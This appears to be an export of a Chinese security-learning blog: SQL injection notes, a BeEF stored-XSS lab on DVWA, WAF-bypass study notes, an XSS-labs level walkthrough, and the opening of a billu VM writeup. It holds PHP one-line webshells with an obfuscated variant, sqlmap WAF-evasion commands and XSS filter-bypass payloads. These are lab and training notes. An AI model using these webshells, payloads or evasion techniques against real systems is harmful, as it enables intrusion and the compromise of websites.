<p>   <a href="http://www.xiaodi8.com/index.php?id=8(%E5%AD%98%E5%9C%A8%E5%8F%AF%E6%8E%A7%E5%8F%82%E6%95%B0id)">www.xiaodi8.com/index.php?id=8(存在可控参数id)</a><br>   <a href="http://www.xiaodi8.com/?id=8(%E5%AD%98%E5%9C%A8%E5%8F%AF%E6%8E%A7%E5%8F%82%E6%95%B0%EF%BC%8C%E4%B8%94?%E5%89%8D%E9%9D%A2%E7%9B%B8%E5%BD%93%E4%BA%8E%E7%9C%81%E7%95%A5%E4%BA%86index.php%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%AF%B4%E6%98%AF%E9%BB%98%E8%AE%A4%E6%8C%87%E5%90%91%E6%9F%90%E4%B8%80%E4%B8%AA%EF%BC%8C%E6%9C%AC%E8%B4%A8%E4%B8%8E1%E4%B8%80%E6%A0%B7)">www.xiaodi8.com/?id=8(存在可控参数，且?前面相当于省略了index.php，可以说是默认指向某一个，本质与1一样)</a><br>   <a href="http://www.xiaodi8.com/?id=8&x=1(%E7%9B%B8%E5%BD%93%E4%BA%8E%E4%B8%A4%E4%B8%AA%E5%8F%AF%E6%8E%A7%E5%8F%82%E6%95%B0)">www.xiaodi8.com/?id=8&amp;x=1(相当于两个可控参数)</a><br>   <a href="http://www.xiaodi8.com/index.php(post%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%8F%82%E6%95%B0%E4%B8%8D%E5%9C%A8%E7%BD%91%E5%9D%80%EF%BC%8C%E6%8A%93%E5%8C%85%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0)">www.xiaodi8.com/index.php(post注入，参数不在网址，抓包可以看到)</a></p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">### 已知参数x有注入，以下哪个注入测试正确？</span><br></pre></td></tr></table></figure>
<p>   a.<a href="http://www.xiaodi8.com/news.php?y=1">www.xiaodi8.com/news.php?y=1</a> and 1&#x3D;1 &amp;x&#x3D;2<br>   b.<a href="http://www.xiaodi8.com/news.php?y=1">www.xiaodi8.com/news.php?y=1</a> &amp;x&#x3D;2 and 1&#x3D;1<br>   c.<a href="http://www.xiaodi8.com/news.php?y=1">www.xiaodi8.com/news.php?y=1</a> and 1&#x3D;1 &amp;x&#x3D;2 and 1&#x3D;1<br>   d.<a href="http://www.xiaodi8.com/news.php?xx=1">www.xiaodi8.com/news.php?xx=1</a> and 1&#x3D;1 &amp;xxx&#x3D;2 and 1&#x3D;1<br>   哪个参数有注入，and 1&#x3D;1 注入语句就写在哪个参数的后面（b，c）</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">### 如何获取列名(爆字段)</span><br></pre></td></tr></table></figure>
<p>数据库中有一个information_schmema，<br>有表、字段信息，注入的时候先查表查字段就OK了</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">### union联合注入</span><br></pre></td></tr></table></figure>
<p>有几个注意的点：<br>1.查询返回字段数要和前一个查询（前一个select）字段数相等。<br>2.字段类型也要相对应。！！！！<br>3、把id设置成-2之后，前面select语句条件部分为假就不会执行<br>，从而不会影响到后面select语句的执行结果(-2是为了让他<br>报错从而执行union后的语句)。<br>&#96;&#96;&#96;</p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>利用beef实现简单的XSS跨站攻击</title>
    <url>/2023/10/11/XssSelfPrac/</url>
    <content><![CDATA[<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>实验环境:kali、BeEF、Ubuntu、DVWA<br>若kali没有配置好BeEF,请参考此文章进行配置:<br><a href="https://blog.csdn.net/weixin_44657888/article/details/124692782">https://blog.csdn.net/weixin_44657888/article/details/124692782</a><br>若Ubuntu没有搭建好DVWA,请参考此文章进行搭建:<br><a href="https://blog.csdn.net/ydj2200012810/article/details/132009415">https://blog.csdn.net/ydj2200012810/article/details/132009415</a></p>
<h2 id="开日"><a href="#开日" class="headerlink" title="开日"></a>开日</h2><p>首先在kali启动BeEF服务。<br><img src="https://pic.imgdb.cn/item/6526ae1ac458853aef9760af.png" alt="图一" title="开启beef服务"><br>开启后,会自动跳转至登录界面,用户名默认为beef，密码在首次启动beef-xss时需要手动设置。<br><img src="https://pic.imgdb.cn/item/6526ae8ac458853aef977beb.png" alt="图二" title="beef登录界面"><br>成功登陆后,进入beef主界面<br><img src="https://pic.imgdb.cn/item/6526aedcc458853aef979841.png" alt="图三" title="beef主界面"><br>然后在Ubuntu打开DVWA,选择存储型XSS<br>名字任意填,消息栏填入以下语句即可</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6526b090c458853aef980fa5.png" alt="图四" title="跨站攻击语句"><br>注意,由于前端代码对输入的消息长度有限制,这就导致我们不能完整地输入攻击语句,这个好办<br>右键框框的位置–检查–找到maxlength,改大些<br>而且这里要将你的ip地址换成你的真实ip地址<br><img src="https://pic.imgdb.cn/item/6526b0e3c458853aef98219c.png" alt="图五" title="示例"><br>成功输入后,直接点击guestbook提交<br>此时虽然没看到页面有什么特别的变化,但是右键–检查–网络,可以看到异常数据包<br><img src="https://pic.imgdb.cn/item/6526b300c458853aef98a928.png" alt="图六" title="异常数据包"><br>可以看到,接收到刚才我们输入的ip的数据包,这意味着XSS跨站攻击成功实现。<br>此时,beef的online browsers上线了被攻击靶机的ip,意味着我们可以进行相关操作。<br><img src="https://pic.imgdb.cn/item/6526b3ddc458853aef98dc62.png" alt="图七" title="被攻击机上线"><br>alert 信息<br><img src="https://pic.imgdb.cn/item/6526b4f0c458853aef991048.png" alt="图八" title="显示"><br><img src="https://pic.imgdb.cn/item/6526b4ffc458853aef9912c9.png" alt="图九"><br>浏览器强制跳转<br><img src="https://pic.imgdb.cn/item/6526b837c458853aef99ba40.png" alt="图十" title="网址跳转"><br><img src="https://pic.imgdb.cn/item/6526b655c458853aef996c5b.png" alt="图十一" title="成功跳转"><br>除此之外,甚至还能打开摄像头,还可以利用社工诱使你点你某一个带马的文件,那就可能不是简单地控制浏览器了,有可能你的主机的一些文件会受到影响。</p>
<h2 id="little-总结"><a href="#little-总结" class="headerlink" title="little 总结"></a>little 总结</h2><p>虽然看着功能是挺强大,但是触发条件没有像打靶场一样简单,非常苛刻，既要浏览器版本满足,要存在XSS跨站漏洞,对方的浏览器不会拦截,对方有登陆过且留下痕迹,而且要对方触发。而且当对方设计了过滤,我们还要思考如何绕过这些过滤,总体来说,要考虑非常多。<br>虽然但是,我们还是可以玩玩的。</p>
]]></content>
      <categories>
        <category>Recorder</category>
        <category>XSS跨站</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>WAF绕过</title>
    <url>/2023/11/05/WAFno1/</url>
    <content><![CDATA[<h1 id="WAF绕过-总大纲"><a href="#WAF绕过-总大纲" class="headerlink" title="WAF绕过|总大纲"></a>WAF绕过|总大纲</h1><p><img src="https://pic.imgdb.cn/item/655386c8c458853aefcfb985.png"></p>
<h2 id="信息收集-反爬虫-延时-代理池"><a href="#信息收集-反爬虫-延时-代理池" class="headerlink" title="信息收集|反爬虫|延时|代理池"></a>信息收集|反爬虫|延时|代理池</h2><h3 id="大纲-信息收集-反爬虫-延时-代理池"><a href="#大纲-信息收集-反爬虫-延时-代理池" class="headerlink" title="大纲|信息收集|反爬虫|延时|代理池"></a>大纲|信息收集|反爬虫|延时|代理池</h3><p><img src="https://pic.imgdb.cn/item/65479069c458853aefbc904a.png"><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=45&vd_source=d32bce54780cf3d9710df43274886fde">相关绕过WAF知识点引入:1:00</a></p>
<h3 id="具体分析–以目录扫描为例"><a href="#具体分析–以目录扫描为例" class="headerlink" title="具体分析–以目录扫描为例"></a>具体分析–以目录扫描为例</h3><p>1、相关子域名、不同后缀等资产收集不会触发WAF的拦截。<br>2、目录扫描是直接对对方的网站进行扫描,会触发WAF拦截,<code>那么这时候该如何绕过WAF拦截呢,这才是讨论的关键点</code><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=45&vd_source=d32bce54780cf3d9710df43274886fde">SafeDog-默认拦截机制分析绕过7:00-20:12;20:12-59:00</a><br>1、若对方网站没有开启cc防护,那么我们对其进行目录扫描的速度就很顺畅快捷(有时候出不了结果:尝试更改提交方式或模拟用户数据包解决这个问题)<br>2、但是如果对方网站开启了cc防护,我们就不得不要设置延时扫描,速度必然会慢很多。<code>--延时</code><br>有的网站会对user-agent设计黑白名单,即百度等搜索引擎这种爬虫不会拦截,而其他会拦截。(御剑的自定义header头可以更改)<code>--反爬虫</code><br><code>但这里有一个问题:就是改了UA虽然绕过了,没有被拦截,那么为什么会没出扫描结果？</code><br>答:1、burp模拟用户数据包以及配合模拟爬虫就行了。<br>2、也可以写py脚本。(原因是御剑工具只可以修改数据包的头部，但是我写py脚本也可以自定义数据包,模拟真实用户的数据包实现对网站开启了cc防护的攻击)<br><code>脚本开发的重要性</code><br>3、还可以使用代理池技术<code>--代理池(52:00)</code><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=45&vd_source=d32bce54780cf3d9710df43274886fde">SafeDog|阿里云|宝塔联防 1:00:00</a><br>1、<code>get一个思路,就是当一个网站配置了多个waf时,你可以自己搭建网站,把几个waf绕过轮流试一遍,最后可以绕过的方案取交集即可。</code><br><img src="https://pic.imgdb.cn/item/654ae690c458853aef4629b6.jpg"></p>
<h2 id="漏洞发现-代理池-指纹探针"><a href="#漏洞发现-代理池-指纹探针" class="headerlink" title="漏洞发现|代理池|指纹探针"></a>漏洞发现|代理池|指纹探针</h2><h3 id="大纲-漏洞发现-代理池-指纹探针"><a href="#大纲-漏洞发现-代理池-指纹探针" class="headerlink" title="大纲|漏洞发现|代理池|指纹探针"></a>大纲|漏洞发现|代理池|指纹探针</h3><p><img src="https://pic.imgdb.cn/item/654b6205c458853aefb9b924.png"></p>
<h3 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h3><p>1、当扫描速度过快时,会触发waf拦截,<code>可以采用延迟、代理池、白名单等方法绕过</code><br>2、当工具指纹被识别到时，会触发waf拦截，<code>可以采用修改特征，模拟用户发包等方法绕过</code><br>3、当识别到漏洞payload时，也会触发waf拦截，<code>可以采用数据编译，冷门扫描等方式绕过</code><br>4、若对方网站存在难搞的waf时,若钱包空空如也,那我们可以采用延迟的方式去扫描目录(或者使用免费开源的代理池,但是不稳定)；如果有钱，那我们可以花钱买个隧道代理，开代理池扫描目录。<br>5、扫描对方网站(web)漏洞时，采用awvs延时扫描。<br>6、延迟扫描，当识别到漏洞payload时，会触发waf拦截，所以工具会判定不存在漏洞(但实际可能存在漏洞，只不过被拦截了)，这是就采用冷门工具进行扫描。(指纹没有被采集，漏洞payload也未被收集)<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=46&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">awvs+xray实现漏扫:1:10:00</a></p>
<h2 id="漏洞利用-利用web漏洞上传木马"><a href="#漏洞利用-利用web漏洞上传木马" class="headerlink" title="漏洞利用|利用web漏洞上传木马"></a>漏洞利用|利用web漏洞上传木马</h2><h3 id="大纲-漏洞利用-利用web漏洞上传木马"><a href="#大纲-漏洞利用-利用web漏洞上传木马" class="headerlink" title="大纲|漏洞利用|利用web漏洞上传木马"></a>大纲|漏洞利用|利用web漏洞上传木马</h3><p><img src="https://pic.imgdb.cn/item/655386cdc458853aefcfcf0e.webp"></p>
<h3 id="具体分析-1"><a href="#具体分析-1" class="headerlink" title="具体分析"></a>具体分析</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>两种注入方式：手工、sqlmap。<br>手工注入不必担心cc流量拦截。而使用sqlmap进行注入的时候需要考虑对方是否存在cc流量拦截。<br>使用sqlmap的参考命令（绕过waf）：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">&quot;http://test.xiaodi8.com/sqlilabs/Less-2/?id=1&quot;</span> <span class="attr">--proxy</span>=<span class="string">&quot;http:tps123.kdlapi.com:15818&quot;</span> <span class="attr">--tamper</span>=<span class="string">&quot;waf-dog.py&quot;</span> <span class="attr">--random-agent</span></span><br></pre></td></tr></table></figure>
<p><code>由于sqlmap工具注入时发送的数据包的头部带有sqlmap这个标识、指纹头，所以必须不停变化user-agent</code></p>
<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>php 截断（%00、0x00），参考之前payload上传，绕过waf<br>和前面文件上传专题的绕过方法一样。</p>
<h4 id="xss跨站"><a href="#xss跨站" class="headerlink" title="xss跨站"></a>xss跨站</h4><p>利用xss trike绕过，加上–timeout或者–proxy绕过cc。</p>
<h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p>常用的是远程代码执行（eval），但是waf会对phpinfo()、system等函数过滤。<br>我们就要对传入url的payload操作以下实现绕过<br>1、进行加密编码。<br>2、str_replace函数替换。<br>3、关键词先拆分后拼接。<br>4、自己在post数据框加入提交方式，然后传值。</p>
<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>以下几种：..\ ….&#x2F; ...\等，详情见<br><a href="https://fzsecurity-github.github.io/2023/10/14/wenjianbaohan/">https://fzsecurity-github.github.io/2023/10/14/wenjianbaohan/</a></p>
<h2 id="权限控制-代码混淆"><a href="#权限控制-代码混淆" class="headerlink" title="权限控制|代码混淆"></a>权限控制|代码混淆</h2><h3 id="大纲-权限控制-代码混淆"><a href="#大纲-权限控制-代码混淆" class="headerlink" title="大纲|权限控制|代码混淆"></a>大纲|权限控制|代码混淆</h3><p><img src="https://pic.imgdb.cn/item/6550d776c458853aef9add60.png"></p>
<h3 id="具体分析-听课笔记"><a href="#具体分析-听课笔记" class="headerlink" title="具体分析|听课笔记"></a>具体分析|听课笔记</h3><p>1、脚本语言类型无关紧要，重要的是思路，思路一般都是互通的。</p>
<p>2、代码层面绕过检测：变量覆盖、加密混淆、异或加密生成–项目webshell-venom-master（p47：13：00）</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">assert</span><span class="params">($_POST[<span class="string">&#x27;chopper&#x27;</span>])</span></span><span class="comment">//更灵活</span></span><br><span class="line">@<span class="built_in">eval</span>($_POST<span class="selector-attr">[<span class="string">&#x27;chopper&#x27;</span>]</span>)</span><br></pre></td></tr></table></figure>
<p><code>(1)、变量覆盖</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="variable">$$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;z&#x27;</span>]);<span class="comment">//此处可以排行base64编码</span></span><br><span class="line"><span class="comment">//?x=b&amp;y=assert--传参</span></span><br><span class="line"><span class="comment">//$a $$a=assert=$b--传参</span></span><br><span class="line"><span class="comment">//assert($_POST[&#x27;chopper&#x27;])--最终构成一句话木马</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>值得一提的是，变量拼接(覆盖)的方式只在低版本的php有用，目前不缺少通杀马，所有这种方法是个鸡肋</code><br><code>(2)、加密混淆</code><br>下载地址：<br><a href="https://github.com/djunny/enphp">https://github.com/djunny/enphp</a><br>目标加密的代码（不是编码），这样是绕过的一种思路，不要将code_test的文件移到或者删除很有可能会导致使用失败。<br><code>如果上面的方式被安全狗杀掉，或者过不了宝塔的话。</code><br>借用在线API接口实现加密混淆<br>网址：<br><a href="http://phpjiami.com/phpjiami.html">http://phpjiami.com/phpjiami.html</a><br><code>有些后门代码为了绕过检测对代码采取了编码（对一句话木马的关键代码进行base64编码）。这样可以绕过waf，但是可能不被webshell管理工具所接受（连接不上，因为代码存在base64解码，但是websehll管理工具不存在自动base编码）--就比如异或生成的木马，蚁剑就连不上去（这时候我们就要给传输的数据包进行base64编码，蚁剑的编码器的base64勾上就可以连接得上，但是冰蝎不知道如何操作）</code></p>
<p>3、webshell工具优缺点<br>菜刀，蚁剑，冰蝎优缺点<br>菜刀:未更新状态，无插件，单向加密传输<br>蚁剑:更新状态，有插件，拓展性强，单向加密传输<br>冰蝎:更新状态，未知插件，拓展性强，偏向于后渗透，双向加密传输<br>单双向加密传输的区别：<br>双向加密传输就是发包之前已经加密了，并且从服务器传回来的数据也是加密的，这样在安全狗这些WAF检测内容的时候就狠nice。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=47&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">了解websehll工具原理以及不同工具的原理对比:1:09:00</a></p>
<p>4、自写轮子<br>在webshell连接之后，查看目录发现获取不了。<br>原因：对方waf识别到webshell指纹，拦截；对方waf检测到敏感操作，拦截。<br><code>那么只可以自己造轮子</code>（last 10min）<br>1、成功上传后门脚本文件以后，我不使用webshell工具连接，我通过抓取webshell连接的数据包分析，我可以post传送其他读取文件（夹）的函数（payload）过去也可以实现。（就相当于代码执行）<br>2、有了这样的思路，我们就可以自己写一个webshell工具了。</p>
]]></content>
      <categories>
        <category>WAF绕过</category>
      </categories>
      <tags>
        <tag>WAF绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS-labs通关little心得</title>
    <url>/2023/10/12/XssSelfPrac2/</url>
    <content><![CDATA[<p><code>获取cookie：&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h2><p>修改name属性的值,发现页面回显也随之变化,那么我们便可以考虑向此处插入js语句<br><img src="https://pic.imgdb.cn/item/6527faa3c458853aefb0929f.png" alt="图一" title="level-1.1"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6527fadec458853aefb1a100.png" alt="图二" title="level-1.2"><br>点击搜索,成功,直接进入下一关。</p>
<h2 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h2><p>直接在搜索框插入以下语句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>发现通关失败。<br>右键-查看元素<br><img src="https://pic.imgdb.cn/item/6527fc52c458853aefb859ae.png" alt="图三" title="level-2.1"><br>发现js语句被””号扩了起来,发挥不了作用,那么我们直接利用闭合的思想。填入payload,点击搜索,成功通关。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h2><p>来到第三关,啥也不想,直接把上一关的通关语句填入,失败,那好继续查看元素。<br><img src="https://pic.imgdb.cn/item/6527fdcdc458853aefbf5be2.png" alt="图四" title="level-3.1"><br>发现很奇怪,明明就像第二关一样,利用了闭合的思想,那为什么还是通关不了。<br>这里要用到代码审计,查看源码<br><img src="https://pic.imgdb.cn/item/6527fe37c458853aefc16465.png" alt="图五" title="level-3.2"><br>后端利用htmlspecialchars()函数会将特殊字符进行转义，这里无法采用标签，因为标签都是带有”&lt;”的。但该函数不会转义单引号，可以采用事件(onclick,可以实现和标签一样的功能)闭合标签。填入以下payload(注意闭合),点击搜索框(不是搜索,因为点击事件要在框内触发),成功。</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;onclick=&#x27;</span><span class="function"><span class="title">alert</span>(<span class="number">1</span>)</span></span><br></pre></td></tr></table></figure>
<h2 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h2><p>来到第四关,与第三关一样,把payload中的’换成”,之后点击搜索框即可。</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;onclick=&quot;</span><span class="function"><span class="title">alert</span>(<span class="number">1</span>)</span></span><br></pre></td></tr></table></figure>
<h2 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h2><p>继续填入上关的payload,右键-查看元素,发现on被替换成o_n了。<br><img src="https://pic.imgdb.cn/item/65280046c458853aefcb4287.png" alt="图六" title="level-5.1"><br>代码审计,发现过滤了script标签和on关键字。<br>没事,我们还有伪协议–超链接跳转。<br>填入下列palayload</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a href=&quot;</span>javascrip<span class="variable">t:alert</span>(<span class="number">1</span>)<span class="comment">&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>之后页面会出现一个”&gt;(一举两得,即闭合,又是超链接)的超链接<br><img src="https://pic.imgdb.cn/item/652801acc458853aefd2602a.png" alt="图七" title="level-5.2"><br>点击这个链接,成功通关。</p>
<h2 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h2><p>继续使用上一关的payload看行不行,发现不行,只好看代码了。<br><img src="https://pic.imgdb.cn/item/65280271c458853aefd5f767.png" alt="图八" title="level-6.1"><br>不给活路啊,过滤了一大堆。<br>但细看,他并没有大小写转换啊,也就是说我可以利用大小写绕过,填入以下payload</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Onclick=&quot;</span><span class="function"><span class="title">alert</span>(<span class="number">1</span>)</span></span><br></pre></td></tr></table></figure>
<p>点击搜索框,成功过关。</p>
<h2 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h2><p>我继续输入上一关的payload,发现on直接被替换成空串了<br><img src="https://pic.imgdb.cn/item/65280385c458853aefdb9d68.png" alt="图九" title="level-7.1"><br>简单,尝试重(双)写绕过,看它是否循环过滤,填入以下payload</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;oonnclick=&quot;</span><span class="function"><span class="title">alert</span>(<span class="number">1</span>)</span></span><br></pre></td></tr></table></figure>
<p>点击搜索框,成功通关。</p>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h2><p>这里是把我们输入的payload点击添加友情链接后就可以直接跳转了,简单,填入以下payload,正好利用伪协议。</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">javascript</span>:<span class="function"><span class="title">alert</span>(<span class="number">1</span>)</span></span><br></pre></td></tr></table></figure>
<p>添加友链后,但是代码里面进行了script的替换<br><img src="https://pic.imgdb.cn/item/652805e0c458853aefe7aa0a.png" alt="图十" title="level-8.1"><br>那我们只要让代码识别不出是script就行，把script里面随便一个字母(如s)通过html编码，然后再通过url编码。<br><img src="https://pic.imgdb.cn/item/652805e0c458853aefe7aa0a.png" alt="图十一" title="level-8.2"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span>%<span class="number">26</span>%<span class="number">23</span>%<span class="number">78</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">3</span>bcript:alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>理论上应该可以,但我通关失败,提示403错误,换了几个浏览器都不行,望大佬斧正。</p>
]]></content>
      <categories>
        <category>Recorder</category>
        <category>XSS跨站</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>billu</title>
    <url>/2023/12/01/billu/</url>
    <content><![CDATA[<p>时隔一个月，失踪人口回归(bushi，这么久没碰过靶机，今天我们来碰一下靶机。<br>靶机：billu<br>攻击机：kali</p>
<h2 id="一、前期工作-信息收集"><a href="#一、前期工作-信息收集" class="headerlink" title="一、前期工作|信息收集"></a>一、前期工作|信息收集</h2><p>开启靶机，是如下的一个界面。<br><img src="https://pic.imgdb.cn/item/6569fb84c458853aef2ae80a.jpg"></p>
<h3 id="判断受害主机ip"><a href="#判断受害主机ip" class="headerlink" title="判断受害主机ip"></a>判断受害主机ip</h3><p>由于我们不知道靶机的ip，我们先nmap扫一下</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sP <span class="number">192.168.200.0</span>/<span class="number">24</span>  </span><br></pre></td></tr></table></figure>
<p>扫到如下存活主机ip<br><img src="https://pic.imgdb.cn/item/6569fb96c458853aef2b3c1a.jpg"><br>经过测试，192.168.200.6这个是目的靶机，打开，显示如下界面<br><img src="https://pic.imgdb.cn/item/6569fba1c458853aef2b6ffc.jpg"></p>
<h3 id="具体扫描"><a href="#具体扫描" class="headerlink" title="具体扫描"></a>具体扫描</h3><p>既然找到了目的靶机，那么我们先对其进行nmap扫描先</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -<span class="keyword">A</span> -n <span class="number">192.168.200.6</span> </span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6569fbb2c458853aef2bc05f.jpg"><br>对我来说有用处的：22|80.</p>
<h2 id="二、web渗透"><a href="#二、web渗透" class="headerlink" title="二、web渗透"></a>二、web渗透</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>得到如上信息，我们先进行web渗透，我们先试试sql注入，因为提示”Show me your SQLI skills”。</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="comment">&#x27;</span></span><br><span class="line"><span class="number">1</span><span class="comment">&#x27; or 1=1#</span></span><br><span class="line"><span class="symbol">1 </span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1#</span></span><br></pre></td></tr></table></figure>
<p>以上payload全在用户名处输入，密码随便输。<br>但是无一例外，全都提示”try again”。<br><img src="https://pic.imgdb.cn/item/6569fbc8c458853aef2c25e7.jpg"><br>再使用sqlmal尝试一下</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -u <span class="string">&quot;http://192.168.200.6/index.php?un=1&amp;ps=1&quot;</span>  </span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/656aa16ac458853aefca5377.jpg"><br>判定不存在注入点，那就放弃sql注入登录后台。</p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>由于sql注入没得到什么有用的信息，且80端口的页面没什么值得操作的，接下来我们进行目录扫描。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">gobuster dir -w <span class="regexp">/usr/</span>share<span class="regexp">/dirbuster/</span>wordlists<span class="regexp">/directory-list-2.3-medium.txt -u http:/</span><span class="regexp">/192.168.200.6</span></span><br></pre></td></tr></table></figure>
<p>读出以下几个目录<br><img src="https://pic.imgdb.cn/item/6569fbf1c458853aef2d4f2b.jpg"><br>访问除了状态码为403的，一个一个康康。</p>
<h4 id="index"><a href="#index" class="headerlink" title="&#x2F;index"></a>&#x2F;index</h4><p>就是主界面<br><img src="https://pic.imgdb.cn/item/6569fc05c458853aef2da9d4.jpg"></p>
<h4 id="images"><a href="#images" class="headerlink" title="&#x2F;images"></a>&#x2F;images</h4><p>这个界面有点用处吧，是存储上传的图片的目录。<br><img src="https://pic.imgdb.cn/item/6569fc14c458853aef2df077.jpg"><br>如果存在上传漏洞的话，那我们上传的文件会存储在这里。</p>
<h4 id="in"><a href="#in" class="headerlink" title="&#x2F;in"></a>&#x2F;in</h4><p>这个页面就牛了，phpinfo()的界面，许多敏感参数，操作，什么开关之类的我们可以知道开没开。<br><img src="https://pic.imgdb.cn/item/6569fc2dc458853aef2e6853.jpg"><br>发现open_basedir的值没有设置，也就是没有对用户可操作的文件范围做限制。但是allow_url_include&#x3D;Off，所以说我们无法使用php:&#x2F;&#x2F;input和data:&#x2F;&#x2F;进行写shell操作。</p>
<h4 id="uploaded-images"><a href="#uploaded-images" class="headerlink" title="&#x2F;uploaded_images"></a>&#x2F;uploaded_images</h4><p>&#x2F;uploaded_images 也是存储上传图片的那个目录（后期会知道）。</p>
<h4 id="add"><a href="#add" class="headerlink" title="&#x2F;add"></a>&#x2F;add</h4><p>一个文件上传的界面，这里我尝试上了一个.php文件，但是没有提示成没成功，返回之前的&#x2F;images界面，没发现上传的文件，说明失败，看后续怎么利用吧，现在暂时不知道这个上传功能究竟是个摆设还是因为权限不够导致上传不了。<br><img src="https://pic.imgdb.cn/item/6569fc39c458853aef2e9e35.jpg"></p>
<h4 id="test"><a href="#test" class="headerlink" title="&#x2F;test"></a>&#x2F;test</h4><p>这个界面超级有用的。提示缺少一个参数”file”,即file参数是空的，请给file参数提供路径。<br><img src="https://pic.imgdb.cn/item/6569fc45c458853aef2ed208.jpg"><br><code>猜测是文件包含，而file就是文件包含的关键参数，应该可以实现文件的下载。那么我们尝试在url中给出file参数，尝试读取/etc/passwd文件试试</code></p>
